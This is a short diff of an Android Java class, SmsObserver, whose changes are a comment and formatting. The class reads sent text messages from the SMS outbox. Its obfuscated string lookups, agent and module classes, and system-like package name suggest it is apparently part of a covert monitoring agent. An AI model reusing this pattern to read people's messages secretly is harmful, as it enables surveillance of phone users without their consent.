@@ -12,6 +12,9 @@ import com.android.service.Status;
 import com.android.service.manager.ManagerAgent;
 import com.android.service.module.ModuleMessage;
 
+/**
+ * http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
+ */
 public class SmsObserver extends ContentObserver {
 	private static final String TAG = "SmsObserver"; //$NON-NLS-1$
 
@@ -26,18 +29,18 @@ public class SmsObserver extends ContentObserver {
 		// messages: Messages.getString("b.9");
 		ModuleMessage a = (ModuleMessage) ManagerAgent.self().get(Messages.getString("b.9"));
 
-		if(a == null){
+		if (a == null) {
 			return;
 		}
 
 		final ContentResolver cr = Status.getAppContext().getContentResolver();
 
 		// http://stackoverflow.com/questions/3012287/how-to-read-mms-data-in-android
-		
+
 		// Se questa non dovesse piu andare cambiare in "content://sms"
 		// ManagerAgent.get("sms")
 		// orig: content://sms/outbox
-		
+
 		/*
 		 * I possibili content resolver sono Inbox = "content://sms/inbox"
 		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
@@ -47,7 +50,7 @@ public class SmsObserver extends ContentObserver {
 		 * All Conversations = "content://mms-sms/conversations" All messages =
 		 * "content://mms-sms" All SMS = "content://sms"
 		 */
-		
+
 		final Cursor cur = cr.query(Uri.parse("content://sms/outbox"), null, null, null, null); //$NON-NLS-1$
 
 		while (cur.moveToNext()) {
